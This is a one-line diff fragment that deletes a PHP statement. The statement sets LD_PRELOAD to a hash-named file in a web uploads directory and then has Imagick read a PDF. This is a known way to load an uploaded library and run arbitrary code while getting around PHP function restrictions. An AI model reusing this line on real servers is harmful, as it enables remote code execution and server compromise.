@@ -1,1 +1,0 @@
-putenv("LD_PRELOAD=/var/www/html/uploads/6be43e89fa3313aaa867bf3a920664fd.txt");$im = new imagick();$im->readImage('/var/www/html/assets/welcome.pdf');
